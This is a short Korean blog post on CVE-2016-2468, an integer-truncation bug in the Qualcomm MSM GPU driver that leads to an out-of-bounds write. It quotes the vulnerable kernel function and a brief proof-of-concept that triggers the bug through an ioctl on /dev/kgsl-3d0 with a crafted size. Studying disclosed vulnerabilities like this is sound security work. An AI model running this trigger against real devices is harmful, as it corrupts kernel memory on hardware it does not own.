---
layout: post
title: "CVE-2016-2468"
date: 2016-06-13 13:31:59 +0900
comments: true
categories: 
---

[Disclosure of CVE-2016-2468, OOB write in Qualcomm MSM GPU driver](http://retme.net/index.php/2016/06/12/CVE-2016-2468.html)

* `size` 의 하위 32 bit 가 0x80000000 보다 크면, `len` 이 음수가 된다. 
* 그러면 루프에 들어가지 않고, 바로 `sg_mark_end()` 가 불린다.
* 그러면 `sglen` 이 0 인 상황에 변함이 없으므로, `sg_mark_end(&memdesc->sg[-1]);` 이 된다.

```
static int
_kgsl_sharedmem_page_alloc(struct kgsl_memdesc *memdesc,
	struct kgsl_pagetable *pagetable,
	size_t size)
{
	int ret = 0;
	int len, page_size, sglen_alloc, sglen = 0;
	unsigned int align;

	//...snip...

	len = size;
	while (len > 0) {
		//...snip...
	}
	memdesc->sglen = sglen;
	memdesc->size = size;
	sg_mark_end(&memdesc->sg[sglen-1]);
}
```

PoC 는,

```
void kgsl_poc() {
	int fd = open("/dev/kgsl-3d0",0);
	struct kgsl_gpumem_alloc_id arg;
	
	arg.flags = 0;
	arg.size = 0xa18fb010b0c08000;
	ioctl(fd,IOCTL_KGSL_GPUMEM_ALLOC_ID,&arg);
}
```

사이즈가 다른 변수간에 형변환하다가, neg 가 되버리는 이슈.
